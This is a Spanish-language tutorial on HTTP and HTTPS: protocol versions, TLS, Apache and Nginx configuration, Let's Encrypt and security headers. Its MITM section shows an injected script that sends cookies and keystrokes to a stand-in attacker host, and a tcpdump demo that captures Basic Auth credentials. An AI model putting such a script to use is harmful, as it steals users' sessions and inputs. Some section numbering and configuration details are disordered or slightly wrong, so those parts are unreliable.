# 2.5 HTTP y HTTPS - Protocolo de Transferencia de Hipertexto

> **⚠️ IMPORTANTE**: HTTP (sin cifrado) **NO debe utilizarse** para transmitir información sensible o en sitios de producción modernos. **HTTPS es el estándar obligatorio** desde 2018 según recomendaciones de W3C, IETF, y navegadores principales (Chrome, Firefox, Safari).

## Descripción

### HTTP (HyperText Transfer Protocol)

HTTP es el protocolo de capa de aplicación que fundamenta la World Wide Web, diseñado para la transferencia de documentos de hipertexto (HTML) y recursos multimedia entre clientes (navegadores) y servidores web.

**Características fundamentales:**
- **Protocolo cliente-servidor**: El cliente inicia solicitudes, el servidor responde
- **Sin estado (stateless)**: Cada solicitud es independiente, no hay memoria entre transacciones
- **Basado en texto**: Headers y métodos son legibles en ASCII (HTTP/1.x)
- **Puerto predeterminado**: TCP 80
- **Extensible**: Permite headers personalizados y nuevos métodos

**Estructura de una transacción HTTP:**

```
┌─────────────┐                                    ┌──────────────┐
│   Cliente   │                                    │   Servidor   │
│ (Navegador) │                                    │     Web      │
└──────┬──────┘                                    └──────┬───────┘
       │                                                  │
       │ 1. REQUEST: GET /index.html HTTP/1.1            │
       │    Host: www.ejemplo.com                        │
       │    User-Agent: Mozilla/5.0                      │
       ├─────────────────────────────────────────────────>│
       │                                                  │
       │                                2. PROCESSING     │
       │                                (buscar recurso)  │
       │                                                  │
       │            3. RESPONSE: HTTP/1.1 200 OK          │
       │               Content-Type: text/html            │
       │               Content-Length: 1234               │
       │               [BODY: contenido HTML]             │
       │<─────────────────────────────────────────────────┤
       │                                                  │
       │ 4. RENDERING (navegador muestra página)         │
       │                                                  │
```

### Evolución de HTTP

#### HTTP/1.0 (RFC 1945, 1996)
- **Una conexión por recurso**: Cada imagen, CSS, JS requiere nueva conexión TCP
- **Sin persistencia**: Connection: close después de cada respuesta
- **Ineficiente**: Handshake TCP repetido para cada recurso

#### HTTP/1.1 (RFC 2616, 1999 → RFC 7230-7235, 2014)
- **Conexiones persistentes**: Connection: keep-alive (por defecto)
- **Pipelining**: Múltiples requests sin esperar respuestas (poco implementado)
- **Host header obligatorio**: Permite hosting virtual (múltiples sitios en 1 IP)
- **Chunked transfer encoding**: Streaming de respuestas
- **Cache mejorado**: ETag, If-Modified-Since, Cache-Control

#### HTTP/2 (RFC 7540, 2015)
- **Multiplexación binaria**: Múltiples streams en 1 conexión TCP
- **Compresión de headers**: HPACK reduce overhead
- **Server Push**: Servidor envía recursos antes de solicitarlos
- **Priorización de streams**: Control de qué recursos cargar primero
- **Requiere TLS en navegadores**: HTTPS obligatorio en la práctica

```
HTTP/1.1: 6 conexiones paralelas (límite navegador)
┌────────┐  ┌────────┐  ┌────────┐  ┌────────┐  ┌────────┐  ┌────────┐
│Conn 1  │  │Conn 2  │  │Conn 3  │  │Conn 4  │  │Conn 5  │  │Conn 6  │
│HTML    │  │CSS     │  │JS      │  │Img1    │  │Img2    │  │Img3    │
└────────┘  └────────┘  └────────┘  └────────┘  └────────┘  └────────┘

HTTP/2: 1 conexión, múltiples streams
┌──────────────────────────────────────────────────────────────────────┐
│                        Conexión TCP única                            │
├────────┬────────┬────────┬────────┬────────┬────────┬────────────────┤
│Stream 1│Stream 2│Stream 3│Stream 4│Stream 5│Stream 6│Stream N        │
│HTML    │CSS     │JS      │Img1    │Img2    │Img3    │(interleaved)   │
└────────┴────────┴────────┴────────┴────────┴────────┴────────────────┘
```

#### HTTP/3 (RFC 9114, 2022)
- **QUIC en lugar de TCP**: Protocolo de transporte sobre UDP
- **0-RTT connection establishment**: Conexión instantánea en visitas repetidas
- **Sin head-of-line blocking**: Pérdida de paquetes no bloquea otros streams
- **Migración de conexión**: Cambio de red (WiFi → 4G) sin reiniciar conexión
- **TLS 1.3 integrado**: Cifrado incorporado en QUIC

### HTTPS (HTTP Secure)

HTTPS es HTTP sobre TLS/SSL, proporcionando tres garantías fundamentales:
1. **Cifrado**: Los datos son ilegibles para interceptores
2. **Autenticación**: Verificación de identidad del servidor (certificado X.509)
3. **Integridad**: Detección de modificaciones en tránsito (HMAC)

**Puerto predeterminado**: TCP 443

**Proceso de establecimiento (TLS 1.3 handshake):**

```
Cliente                                          Servidor
   │                                                │
   │ 1. ClientHello                                 │
   │    - Versiones TLS soportadas                  │
   │    - Cipher suites preferidas                  │
   │    - Extensiones (SNI, ALPN)                   │
   ├───────────────────────────────────────────────>│
   │                                                │
   │                              2. ServerHello    │
   │                 - Cipher suite seleccionada    │
   │                 - Certificado X.509            │
   │                 - Clave pública servidor       │
   │<───────────────────────────────────────────────┤
   │                                                │
   │ 3. Cliente verifica certificado                │
   │    - Cadena de confianza hasta CA raíz         │
   │    - Validez de fechas                         │
   │    - Revocación (OCSP)                         │
   │                                                │
   │ 4. Derivación de claves simétricas             │
   │    (intercambio Diffie-Hellman)                │
   │                                                │
   │ 5. Finished (cifrado con clave simétrica)      │
   ├───────────────────────────────────────────────>│
   │                                                │
   │                          6. Finished (cifrado) │
   │<───────────────────────────────────────────────┤
   │                                                │
   │ 7. Application Data (HTTP cifrado)             │
   │<──────────────────────────────────────────────>│
```

**TLS 1.3 vs TLS 1.2:**
- **1-RTT handshake** vs 2-RTT (más rápido)
- **0-RTT resumption** para conexiones repetidas
- **Cipher suites simplificadas**: Solo AEAD (Authenticated Encryption with Associated Data)
- **Forward Secrecy obligatorio**: Ephemeral Diffie-Hellman siempre
- **Eliminación de algoritmos obsoletos**: RSA key exchange, SHA-1, MD5, RC4, 3DES

### Métodos HTTP

| Método | Descripción | Idempotente | Seguro | Body en request | Body en response |
|--------|-------------|-------------|--------|-----------------|------------------|
| **GET** | Obtener recurso | ✅ | ✅ | ❌ | ✅ |
| **HEAD** | Obtener headers (sin body) | ✅ | ✅ | ❌ | ❌ |
| **POST** | Crear recurso, enviar datos | ❌ | ❌ | ✅ | ✅ |
| **PUT** | Reemplazar recurso completo | ✅ | ❌ | ✅ | ✅ |
| **PATCH** | Modificar parcialmente | ❌ | ❌ | ✅ | ✅ |
| **DELETE** | Eliminar recurso | ✅ | ❌ | ❌ | ✅ |
| **OPTIONS** | Métodos permitidos (CORS) | ✅ | ✅ | ❌ | ✅ |
| **TRACE** | Echo del request (diagnóstico) | ✅ | ✅ | ❌ | ✅ |
| **CONNECT** | Establecer túnel (proxy) | ❌ | ❌ | ❌ | ❌ |

**Idempotente**: Múltiples requests idénticos = mismo efecto que 1 request  
**Seguro**: No modifica estado del servidor (solo lectura)

### Códigos de estado HTTP

**1xx - Informacional** (poco común)
- 100 Continue
- 101 Switching Protocols

**2xx - Éxito**
- 200 OK
- 201 Created
- 204 No Content

**3xx - Redirección**
- 301 Moved Permanently
- 302 Found (redirección temporal)
- 304 Not Modified (cache válida)

**4xx - Error del cliente**
- 400 Bad Request
- 401 Unauthorized (requiere autenticación)
- 403 Forbidden (autenticado pero sin permisos)
- 404 Not Found
- 405 Method Not Allowed
- 429 Too Many Requests (rate limiting)

**5xx - Error del servidor**
- 500 Internal Server Error
- 502 Bad Gateway (proxy/balanceador no puede alcanzar backend)
- 503 Service Unavailable (sobrecarga o mantenimiento)
- 504 Gateway Timeout

## Instalación y Configuración

### 1. Apache HTTP Server

**Instalación en Ubuntu Server 22.04/24.04:**

```bash
# Actualizar repositorios
sudo apt update

# Instalar Apache
sudo apt install apache2 -y

# Verificar instalación
apache2 -v
# Server version: Apache/2.4.52 (Ubuntu)

# Habilitar inicio automático
sudo systemctl enable apache2

# Iniciar servicio
sudo systemctl start apache2

# Verificar estado
sudo systemctl status apache2
```

**Instalación en Rocky Linux 9:**

```bash
# Instalar Apache (httpd)
sudo dnf install httpd -y

# Habilitar e iniciar servicio
sudo systemctl enable httpd --now

# Configurar firewall
sudo firewall-cmd --permanent --add-service=http
sudo firewall-cmd --permanent --add-service=https
sudo firewall-cmd --reload

# Verificar
curl http://localhost
```

**Instalación en Windows Server 2022:**

Apache no es común en Windows Server. Se prefiere IIS (Internet Information Services):

```powershell
# Instalar IIS con PowerShell
Install-WindowsFeature -name Web-Server -IncludeManagementTools

# Verificar
Get-Service W3SVC
```

**Configuración básica de Apache (Virtual Host HTTP):**

```apache
# /etc/apache2/sites-available/ejemplo.com.conf (Ubuntu)
# /etc/httpd/conf.d/ejemplo.com.conf (Rocky)

<VirtualHost *:80>
    ServerName ejemplo.com
    ServerAlias www.ejemplo.com
    ServerAdmin admin@ejemplo.com
    
    DocumentRoot /var/www/ejemplo.com/public_html
    
    <Directory /var/www/ejemplo.com/public_html>
        Options -Indexes +FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>
    
    ErrorLog ${APACHE_LOG_DIR}/ejemplo.com_error.log
    CustomLog ${APACHE_LOG_DIR}/ejemplo.com_access.log combined
    
    # Compresión GZIP
    <IfModule mod_deflate.c>
        AddOutputFilterByType DEFLATE text/html text/plain text/xml text/css
        AddOutputFilterByType DEFLATE application/javascript application/json
    </IfModule>
</VirtualHost>
```

**Habilitar sitio en Ubuntu:**

```bash
# Crear directorio
sudo mkdir -p /var/www/ejemplo.com/public_html
sudo chown -R $USER:$USER /var/www/ejemplo.com

# Crear página de prueba
echo "<h1>Bienvenido a ejemplo.com</h1>" | sudo tee /var/www/ejemplo.com/public_html/index.html

# Habilitar sitio
sudo a2ensite ejemplo.com.conf

# Habilitar módulos necesarios
sudo a2enmod rewrite
sudo a2enmod deflate
sudo a2enmod headers

# Recargar configuración
sudo systemctl reload apache2
```


**Configuración básica de Nginx (Server Block HTTP):**

```nginx
# /etc/nginx/sites-available/ejemplo.com (Ubuntu)
# /etc/nginx/conf.d/ejemplo.com.conf (Rocky)

server {
    listen 80;
    listen [::]:80;
    
    server_name ejemplo.com www.ejemplo.com;
    
    root /var/www/ejemplo.com/public_html;
    index index.html index.htm index.php;
    
    # Logging
    access_log /var/log/nginx/ejemplo.com_access.log;
    error_log /var/log/nginx/ejemplo.com_error.log;
    
    # Compresión gzip
    gzip on;
    gzip_vary on;
    gzip_min_length 1024;
    gzip_types text/plain text/css text/xml text/javascript 
               application/x-javascript application/xml+rss 
               application/json application/javascript;
    
    location / {
        try_files $uri $uri/ =404;
    }
    
    # Cache para archivos estáticos
    location ~* \.(jpg|jpeg|png|gif|ico|css|js|svg|woff|woff2|ttf)$ {
        expires 30d;
        add_header Cache-Control "public, immutable";
    }
    
    # Seguridad: Denegar acceso a archivos ocultos
    location ~ /\. {
        deny all;
        access_log off;
        log_not_found off;
    }
}
```

**Habilitar sitio en Ubuntu:**

```bash
# Crear enlace simbólico
sudo ln -s /etc/nginx/sites-available/ejemplo.com /etc/nginx/sites-enabled/

# Verificar configuración
sudo nginx -t

# Recargar
sudo systemctl reload nginx
```

### 3. Implementación de HTTPS con Let's Encrypt

Let's Encrypt es una Autoridad de Certificación (CA) gratuita y automatizada que emite certificados SSL/TLS válidos usando el protocolo ACME.

**Instalación de Certbot (Apache en Ubuntu):**

```bash
# Instalar Certbot
sudo apt install certbot python3-certbot-apache -y

# Obtener certificado e instalar automáticamente
sudo certbot --apache -d ejemplo.com -d www.ejemplo.com

# Responder preguntas:
# - Email para notificaciones de expiración
# - Aceptar términos de servicio
# - Redirigir HTTP → HTTPS (recomendado: Yes)

# Verificar renovación automática
sudo certbot renew --dry-run

# El timer systemd renovará automáticamente
sudo systemctl status certbot.timer
```

**Instalación de Certbot (Nginx en Ubuntu):**

```bash
# Instalar Certbot para Nginx
sudo apt install certbot python3-certbot-nginx -y

# Obtener certificado
sudo certbot --nginx -d ejemplo.com -d www.ejemplo.com

# Verificar configuración generada
sudo cat /etc/nginx/sites-available/ejemplo.com
```

**Certificado manual con Certbot (webroot):**

```bash
# Útil cuando no se quiere modificación automática
sudo certbot certonly --webroot -w /var/www/ejemplo.com/public_html \
    -d ejemplo.com -d www.ejemplo.com

# Certificados almacenados en:
# /etc/letsencrypt/live/ejemplo.com/fullchain.pem
# /etc/letsencrypt/live/ejemplo.com/privkey.pem
```

**Configuración manual HTTPS en Apache:**

```apache
# /etc/apache2/sites-available/ejemplo.com-ssl.conf

<VirtualHost *:443>
    ServerName ejemplo.com
    ServerAlias www.ejemplo.com
    
    DocumentRoot /var/www/ejemplo.com/public_html
    
    # Certificados SSL
    SSLEngine on
    SSLCertificateFile /etc/letsencrypt/live/ejemplo.com/fullchain.pem
    SSLCertificateKeyFile /etc/letsencrypt/live/ejemplo.com/privkey.pem
    
    # Configuración TLS moderna (Mozilla SSL Configuration Generator)
    SSLProtocol all -SSLv3 -TLSv1 -TLSv1.1
    SSLCipherSuite ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384
    SSLHonorCipherOrder off
    SSLSessionTickets off
    
    # HSTS (HTTP Strict Transport Security)
    Header always set Strict-Transport-Security "max-age=63072000; includeSubDomains; preload"
    
    # Otros headers de seguridad
    Header always set X-Frame-Options "SAMEORIGIN"
    Header always set X-Content-Type-Options "nosniff"
    Header always set Referrer-Policy "strict-origin-when-cross-origin"
    
    # OCSP Stapling
    SSLUseStapling on
    SSLStaplingCache "shmcb:logs/ssl_stapling(32768)"
    
    <Directory /var/www/ejemplo.com/public_html>
        Options -Indexes +FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>
    
    ErrorLog ${APACHE_LOG_DIR}/ejemplo.com_ssl_error.log
    CustomLog ${APACHE_LOG_DIR}/ejemplo.com_ssl_access.log combined
</VirtualHost>

# Redirección HTTP → HTTPS
<VirtualHost *:80>
    ServerName ejemplo.com
    ServerAlias www.ejemplo.com
    
    Redirect permanent / https://ejemplo.com/
</VirtualHost>
```

**Habilitar módulos SSL en Apache:**

```bash
sudo a2enmod ssl
sudo a2enmod headers
sudo a2ensite ejemplo.com-ssl.conf
sudo systemctl reload apache2
```

**Configuración manual HTTPS en Nginx:**

```nginx
# /etc/nginx/sites-available/ejemplo.com

# Redirección HTTP → HTTPS
server {
    listen 80;
    listen [::]:80;
    
    server_name ejemplo.com www.ejemplo.com;
    
    # Permitir challenge de Let's Encrypt
    location /.well-known/acme-challenge/ {
        root /var/www/ejemplo.com/public_html;
    }
    
    # Redirigir todo lo demás a HTTPS
    location / {
        return 301 https://$server_name$request_uri;
    }
}

# Configuración HTTPS
server {
    listen 443 ssl http2;
    listen [::]:443 ssl http2;
    
    server_name ejemplo.com www.ejemplo.com;
    
    root /var/www/ejemplo.com/public_html;
    index index.html index.htm index.php;
    
    # Certificados SSL
    ssl_certificate /etc/letsencrypt/live/ejemplo.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/ejemplo.com/privkey.pem;
    
    # Configuración TLS moderna (Mozilla SSL Configuration Generator)
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384';
    ssl_prefer_server_ciphers off;
    
    # Sesión SSL
    ssl_session_cache shared:SSL:10m;
    ssl_session_timeout 10m;
    ssl_session_tickets off;
    
    # OCSP Stapling
    ssl_stapling on;
    ssl_stapling_verify on;
    ssl_trusted_certificate /etc/letsencrypt/live/ejemplo.com/chain.pem;
    resolver 8.8.8.8 8.8.4.4 valid=300s;
    resolver_timeout 5s;
    
    # HSTS
    add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
    
    # Otros headers de seguridad
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    
    # Content Security Policy (ejemplo básico)
    add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';" always;
    
    # Compresión gzip
    gzip on;
    gzip_vary on;
    gzip_min_length 1024;
    gzip_types text/plain text/css text/xml text/javascript 
               application/x-javascript application/xml+rss 
               application/json application/javascript;
    
    location / {
        try_files $uri $uri/ =404;
    }
    
    # Cache para archivos estáticos
    location ~* \.(jpg|jpeg|png|gif|ico|css|js|svg|woff|woff2|ttf|eot)$ {
        expires 30d;
        add_header Cache-Control "public, immutable";
    }
    
    # Seguridad
    location ~ /\. {
        deny all;
        access_log off;
        log_not_found off;
    }
    
    access_log /var/log/nginx/ejemplo.com_ssl_access.log;
    error_log /var/log/nginx/ejemplo.com_ssl_error.log;
}
```

### 4. Habilitar HTTP/2 y HTTP/3

**HTTP/2 en Apache:**

```bash
# Habilitar módulo HTTP/2
sudo a2enmod http2

# Editar configuración SSL
sudo nano /etc/apache2/sites-available/ejemplo.com-ssl.conf
```

```apache
<VirtualHost *:443>
    # ... configuración existente ...
    
    # Habilitar HTTP/2
    Protocols h2 http/1.1
    
    # ... resto de configuración ...
</VirtualHost>
```

```bash
# Recargar Apache
sudo systemctl reload apache2

# Verificar con navegador o curl
curl -I --http2 https://ejemplo.com
```

**HTTP/2 en Nginx** (ya habilitado en configuración anterior con `http2` en directive `listen`):

```nginx
listen 443 ssl http2;
```

**HTTP/3 en Nginx** (requiere compilación con QUIC o módulo adicional):

```bash
# HTTP/3 experimental en Nginx mainline
# Requiere Nginx compilado con --with-http_v3_module
# O usar Nginx QUIC build

# Instalación de Nginx con QUIC (Ubuntu)
sudo add-apt-repository ppa:nginx/development -y
sudo apt update
sudo apt install nginx-extras -y
```

```nginx
# Configuración HTTP/3
server {
    listen 443 ssl http2;
    listen 443 quic reuseport;  # HTTP/3
    
    http2_push_preload on;
    http3_max_field_size 8k;
    
    # Alt-Svc header para anunciar HTTP/3
    add_header Alt-Svc 'h3=":443"; ma=86400' always;
    
    # ... resto de configuración ...
}
```

**Nota**: HTTP/3 todavía tiene soporte limitado en servidores de producción (2026). Nginx QUIC está en desarrollo activo, Caddy tiene mejor soporte nativo.

### 5. Certificados auto-firmados (solo para desarrollo/testing)

**Generar certificado auto-firmado con OpenSSL:**

```bash
# Generar clave privada y certificado (válido 365 días)
sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
    -keyout /etc/ssl/private/ejemplo-selfsigned.key \
    -out /etc/ssl/certs/ejemplo-selfsigned.crt

# Responder preguntas (CN=ejemplo.com es importante)
# Country Name: MX
# State: Jalisco
# Locality: Guadalajara
# Organization: TECNM
# Common Name: ejemplo.com

# Generar parámetros Diffie-Hellman (mejora seguridad)
sudo openssl dhparam -out /etc/ssl/certs/dhparam.pem 2048
```

**Configurar en Nginx:**

```nginx
server {
    listen 443 ssl http2;
    
    ssl_certificate /etc/ssl/certs/ejemplo-selfsigned.crt;
    ssl_certificate_key /etc/ssl/private/ejemplo-selfsigned.key;
    ssl_dhparam /etc/ssl/certs/dhparam.pem;
    
    # ... resto de configuración ...
}
```

## Aspectos de Seguridad

### 1. Vulnerabilidades de HTTP (texto plano)

#### Problema: Intercepción de credenciales

**Escenario**: Usuario envía credenciales HTTP Basic Auth sobre HTTP (sin TLS).

```
Cliente                    Atacante (MITM)              Servidor
   │                              │                         │
   │  GET /admin HTTP/1.1         │                         │
   │  Authorization: Basic        │                         │
   │  dXNlcjpwYXNzd29yZA==       │                         │
   ├─────────────────────────────>│                         │
   │                              │                         │
   │                              │ (captura paquete)       │
   │                              │ (decodifica base64)     │
   │                              │ user:password           │
   │                              │                         │
   │                              ├────────────────────────>│
   │                              │  (reenvía o modifica)   │
```

**Demostración con tcpdump:**

```bash
# Terminal 1: Captura
sudo tcpdump -i any -A 'tcp port 80 and host ejemplo.com'

# Terminal 2: Request con credenciales
curl http://ejemplo.com/admin -u "admin:secretpassword"

# En la captura se verá:
# Authorization: Basic YWRtaW46c2VjcmV0cGFzc3dvcmQ=
# Decodificar: echo "YWRtaW46c2VjcmV0cGFzc3dvcmQ=" | base64 -d
# Resultado: admin:secretpassword
```

**Solución**: Usar HTTPS siempre para cualquier autenticación.

#### Problema: Inyección de contenido (Man-in-the-Middle)

Atacante puede modificar respuestas HTTP:

```javascript
// Atacante inyecta script malicioso en respuesta HTTP
<script>
// Robar cookies
fetch('https://atacante.com/steal?cookie=' + document.cookie);

// Keylogger
document.addEventListener('keypress', e => {
    fetch('https://atacante.com/log?key=' + e.key);
});
</script>
```

**Solución**: HTTPS previene modificación de contenido (integridad con HMAC).

### 2. Vulnerabilidades de TLS/SSL

#### Obsoletas (no usar):
- **SSL 2.0** - Roto (RFC 6176, 2011)
- **SSL 3.0** - Vulnerable a POODLE attack (RFC 7568, 2015)
- **TLS 1.0** - Vulnerable a BEAST, deprecated (RFC 8996, 2021)
- **TLS 1.1** - Weak ciphers, deprecated (RFC 8996, 2021)

#### Configuración segura:
```nginx
# Solo TLS 1.2 y 1.3
ssl_protocols TLSv1.2 TLSv1.3;

# Sin cipher suites débiles
ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384';
```

**Vulnerabilidades históricas importantes:**
- **Heartbleed (CVE-2014-0160)**: Fuga de memoria en OpenSSL 1.0.1 - 1.0.1f
- **POODLE (2014)**: Downgrade a SSL 3.0 vulnerable
- **BEAST (2011)**: Ataque a cipher suites CBC en TLS 1.0
- **CRIME/BREACH**: Compresión TLS permite extraer secretos
- **Logjam (2015)**: Debilidad en DHE con claves pequeñas

### 3. HTTP Strict Transport Security (HSTS)

HSTS fuerza a navegadores a usar HTTPS siempre, previniendo downgrade attacks.

**Configuración HSTS:**

```nginx
# Nginx
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
```

```apache
# Apache
Header always set Strict-Transport-Security "max-age=63072000; includeSubDomains; preload"
```

**Parámetros:**
- `max-age=63072000` - 2 años (recomendado)
- `includeSubDomains` - Aplicar HSTS a subdominios
- `preload` - Permitir inclusión en lista de preload de navegadores

**HSTS Preload List**:

Para máxima protección, inscribir dominio en lista de HSTS preload:

```
https://hstspreload.org/

Requisitos:
✅ Certificado válido
✅ Redirigir todo HTTP a HTTPS (base domain y subdominios)
✅ HSTS en base domain con includeSubDomains y preload
✅ max-age >= 31536000 (1 año)
```

### 4. Content Security Policy (CSP)

CSP previene ataques XSS (Cross-Site Scripting) controlando qué recursos puede cargar el navegador.

**CSP básica:**

```nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self' https://cdn.ejemplo.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' https://fonts.gstatic.com;" always;
```

**Directivas importantes:**
- `default-src 'self'` - Solo cargar recursos del mismo origen
- `script-src 'self'` - Scripts solo del mismo dominio
- `style-src 'self' 'unsafe-inline'` - Estilos inline permitidos (evitar si es posible)
- `img-src 'self' data: https:` - Imágenes de cualquier HTTPS + data URIs
- `connect-src 'self'` - Fetch/XHR solo al mismo origen
- `frame-ancestors 'none'` - No permitir iframe (previene clickjacking)

**CSP en modo report-only (testing):**

```nginx
add_header Content-Security-Policy-Report-Only "default-src 'self'; report-uri /csp-report;" always;
```

### 5. Otros headers de seguridad

```nginx
# Prevenir clickjacking (uso en iframes)
add_header X-Frame-Options "SAMEORIGIN" always;

# Prevenir MIME type sniffing
add_header X-Content-Type-Options "nosniff" always;

# XSS Protection (legacy, CSP es mejor)
add_header X-XSS-Protection "1; mode=block" always;

# Controlar información de referrer
add_header Referrer-Policy "strict-origin-when-cross-origin" always;

# Permissions Policy (Feature Policy)
add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;
```

**Script de alerta de expiración:**

```bash
#!/bin/bash
# check_cert_expiry.sh

DOMAIN="$1"
DAYS_WARNING=30

if [ -z "$DOMAIN" ]; then
    echo "Uso: $0 <dominio>"
    exit 1
fi

# Obtener fecha de expiración
EXPIRY_DATE=$(echo | openssl s_client -connect $DOMAIN:443 -servername $DOMAIN 2>/dev/null | \
    openssl x509 -noout -enddate | cut -d= -f2)

# Convertir a timestamp
EXPIRY_EPOCH=$(date -d "$EXPIRY_DATE" +%s)
NOW_EPOCH=$(date +%s)

# Calcular días restantes
DAYS_LEFT=$(( ($EXPIRY_EPOCH - $NOW_EPOCH) / 86400 ))

echo "Certificado de $DOMAIN expira en $DAYS_LEFT días ($EXPIRY_DATE)"

if [ $DAYS_LEFT -lt $DAYS_WARNING ]; then
    echo "⚠️  ADVERTENCIA: Certificado expira pronto!"
    # Enviar alerta (ejemplo con mail)
    # echo "Certificado de $DOMAIN expira en $DAYS_LEFT días" | mail -s "Alerta SSL" admin@ejemplo.com
fi
```

### 8. Protección contra vulnerabilidades web comunes

#### SQL Injection
- Usar **prepared statements** en código backend
- Validar/sanitizar toda entrada de usuario
- WAF (Web Application Firewall) como capa adicional

- Escapar/sanitizar output en HTML
- `HttpOnly` flag en cookies sensibles

#### Cross-Site Request Forgery (CSRF)
- Tokens CSRF en formularios
- Verificar `Referer` header
- SameSite cookies

### 1. Arquitectura de alta disponibilidad con balanceo de carga

**Nginx como Load Balancer (Layer 7):**

```nginx
# /etc/nginx/nginx.conf

http {
    # Definir pool de servidores backend
    upstream backend_servers {
        # Método de balanceo: round-robin (default)
        # Otras opciones: least_conn, ip_hash, hash
        
        server 192.168.1.101:80 weight=3 max_fails=3 fail_timeout=30s;
        server 192.168.1.102:80 weight=2;
        server 192.168.1.103:80 weight=1 backup;  # Solo si otros fallan
        
        # Health check pasivo
        # Active health checks requieren Nginx Plus
    }
    
    # SSL Termination en balanceador
    server {
        listen 443 ssl http2;
        server_name ejemplo.com;
        
        ssl_certificate /etc/letsencrypt/live/ejemplo.com/fullchain.pem;
        ssl_certificate_key /etc/letsencrypt/live/ejemplo.com/privkey.pem;
        ssl_protocols TLSv1.2 TLSv1.3;
        
        # Proxy a backend
        location / {
            proxy_pass http://backend_servers;
            
            # Headers para backend
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
            
            # Timeouts
            proxy_connect_timeout 5s;
            proxy_send_timeout 60s;
            proxy_read_timeout 60s;
            
            # Buffering
            proxy_buffering on;
            proxy_buffer_size 4k;
            proxy_buffers 8 4k;
        }
        
        # Health check endpoint
        location /health {
            access_log off;
            return 200 "healthy\n";
            add_header Content-Type text/plain;
        }
    }
}
```

### 2. CDN (Content Delivery Network)

CDN almacena contenido estático en edge locations cerca de usuarios finales, reduciendo latencia y carga en servidores origen.

**Cloudflare (ejemplo):**

1. **Configuración DNS**: Apuntar dominio a nameservers de Cloudflare
2. **Proxy activado**: Tráfico pasa por Cloudflare (orange cloud ☁️)
3. **Caché automático**: CSS, JS, imágenes cacheadas en edge
4. **SSL/TLS**: Cloudflare proporciona certificado gratuito
5. **DDoS protection**: Mitigación automática

**Page Rules de Cloudflare:**

```
ejemplo.com/static/*
- Cache Level: Cache Everything
- Edge Cache TTL: 1 month
- Browser Cache TTL: 1 day

ejemplo.com/api/*
- Cache Level: Bypass
- Security Level: High
```

**Nginx configurado para CDN:**

```nginx
server {
    listen 80;
    server_name ejemplo.com;
    
    # Cache Control para contenido estático
    location ~* \.(jpg|jpeg|png|gif|ico|css|js|svg|woff|woff2|ttf)$ {
        expires 30d;
        add_header Cache-Control "public, immutable";
        
        # CORS para CDN cross-origin
        add_header Access-Control-Allow-Origin *;
    }
    
    # Sin cache para contenido dinámico
    location / {
        expires -1;
        add_header Cache-Control "no-store, no-cache, must-revalidate, proxy-revalidate";
    }
}
```

### 3. Reverse Proxy para microservicios

**Nginx como API Gateway:**

```nginx
# /etc/nginx/nginx.conf

http {
    # Servicio de usuarios
    upstream users_service {
        server 192.168.1.201:3001;
        server 192.168.1.202:3001;
    }
    
    # Servicio de productos
    upstream products_service {
        server 192.168.1.203:3002;
        server 192.168.1.204:3002;
    }
    
    # Servicio de pagos
    upstream payments_service {
        server 192.168.1.205:3003;
    }
    
    server {
        listen 443 ssl http2;
        server_name api.ejemplo.com;
        
        ssl_certificate /etc/ssl/certs/api.ejemplo.com.crt;
        ssl_certificate_key /etc/ssl/private/api.ejemplo.com.key;
        
        # Rate limiting por API key
        limit_req_zone $http_x_api_key zone=api_limit:10m rate=100r/s;
        
        # Routing a microservicios
        location /api/users {
            limit_req zone=api_limit burst=50;
            
            rewrite ^/api/users(.*)$ $1 break;
            proxy_pass http://users_service;
            
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        }
        
        location /api/products {
            limit_req zone=api_limit burst=50;
            
            rewrite ^/api/products(.*)$ $1 break;
            proxy_pass http://products_service;
            
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
        }
        
        location /api/payments {
            # Más restrictivo para pagos
            limit_req zone=api_limit burst=10;
            
            rewrite ^/api/payments(.*)$ $1 break;
            proxy_pass http://payments_service;
            
            # Timeouts más largos para pagos
            proxy_read_timeout 120s;
            proxy_send_timeout 120s;
        }
        
        # Health check
        location /health {
            access_log off;
            return 200 "OK\n";
            add_header Content-Type text/plain;
        }
    }
}
```

### 6. Documentación de configuración empresarial

**Checklist de deployment HTTPS:**

- [ ] Certificado SSL/TLS instalado (Let's Encrypt o comercial)
- [ ] TLS 1.2 y 1.3 habilitados exclusivamente
- [ ] Cipher suites fuertes configuradas (sin RC4, 3DES, MD5)
- [ ] Forward Secrecy (ECDHE) habilitado
- [ ] OCSP Stapling configurado
- [ ] HSTS habilitado (max-age >= 31536000)
- [ ] Redirección HTTP → HTTPS implementada
- [ ] Headers de seguridad configurados (CSP, X-Frame-Options, etc.)
- [ ] Rate limiting implementado
- [ ] Logging estructurado configurado
- [ ] Monitoreo de certificados (expiración)
- [ ] Backup de claves privadas en lugar seguro
